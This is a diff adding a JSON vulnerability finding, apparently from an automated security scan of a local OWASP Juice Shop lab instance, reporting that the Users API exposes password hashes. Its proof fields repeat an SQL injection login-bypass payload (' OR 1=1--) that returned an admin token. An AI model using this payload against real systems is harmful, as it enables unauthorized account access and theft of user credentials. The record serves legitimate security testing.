@@ -1,0 +1,28 @@
+{
+  "id": "f_1784855310386_17003a",
+  "action": "confirm",
+  "title": "Excessive Data Exposure - Users API Returns Password Hashes",
+  "severity": "high",
+  "finding_kind": "vuln",
+  "location": "GET http://127.0.0.1:3010/api/Users",
+  "url": "GET http://127.0.0.1:3010/api/Users",
+  "description": "The /api/Users endpoint returns all user records including sensitive fields like password hashes (MD5), email addresses, security questions, and roles. While authentication is required, any authenticated user (including attacker who bypasses login via SQLi) can enumerate all users and their password hashes.",
+  "poc": "Probe request against GET http://127.0.0.1:3010/api/Users; observed proving result from prior stage handoff: POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+  "proof": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+  "how_captured": "POST http://127.0.0.1:3010/rest/user/login → 200",
+  "evidence_ids": [
+    "ev_1784855310362_854da1"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784855310362_854da1",
+      "excerpt": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "POST http://127.0.0.1:3010/rest/user/login → 200"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "3010",
+  "created_at": "2026-07-24T01:08:30.386Z"
+}
